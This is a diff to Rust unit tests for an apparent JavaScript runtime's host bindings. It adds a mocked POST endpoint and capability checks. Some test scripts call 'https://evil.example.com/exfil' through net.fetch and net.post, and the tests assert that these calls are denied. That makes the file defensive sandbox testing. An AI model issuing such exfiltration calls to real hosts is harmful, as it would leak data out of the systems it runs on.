@@ -178,16 +178,24 @@ mod tests {
             "http://api.internal/config",
             r#"{"mode":"autonomous","version":2}"#,
         );
+        host.register_http_post_response(
+            "http://api.internal/submit",
+            r#"{"status":"accepted"}"#,
+        );
 
         let script = r#"
             const body = AlloyOS.net.fetch("http://api.internal/config");
             const cfg = JSON.parse(body);
             const st = AlloyOS.sys.status();
 
+            const postResp = AlloyOS.net.post("http://api.internal/submit", JSON.stringify({ ok: true }), { "Content-Type": "application/json" });
+            const postData = JSON.parse(postResp);
+
             const report = {
                 mode: cfg.mode,
                 uptime: st.uptimeMs,
-                tasks: st.activeTasks
+                tasks: st.activeTasks,
+                postStatus: postData.status
             };
 
             AlloyOS.fs.write("/var/report.json", JSON.stringify(report));
@@ -203,7 +211,7 @@ mod tests {
             .expect("host bindings script should succeed");
         assert_eq!(
             res,
-            JsValue::String(r#"{"mode":"autonomous","tasks":7,"uptime":42500}"#.to_string())
+            JsValue::String(r#"{"mode":"autonomous","postStatus":"accepted","tasks":7,"uptime":42500}"#.to_string())
         );
         assert_eq!(
             host.notifications,
@@ -453,6 +461,23 @@ mod tests {
         assert!(matches!(
             rt.eval_with_host(
                 "AlloyOS.net.fetch('https://evil.example.com/exfil');",
+                &mut host
+            ),
+            Err(JsError::ForbiddenCapability(_))
+        ));
+
+        // Allowed net.post to api.alloyos.local, denied to evil.example.com
+        host.register_http_post_response("https://api.alloyos.local/submit", "posted");
+        assert_eq!(
+            rt.eval_with_host(
+                "AlloyOS.net.post('https://api.alloyos.local/submit', 'payload', [['X-Test', '1']]);",
+                &mut host
+            ),
+            Ok(JsValue::String("posted".to_string()))
+        );
+        assert!(matches!(
+            rt.eval_with_host(
+                "AlloyOS.net.post('https://evil.example.com/exfil', 'data');",
                 &mut host
             ),
             Err(JsError::ForbiddenCapability(_))
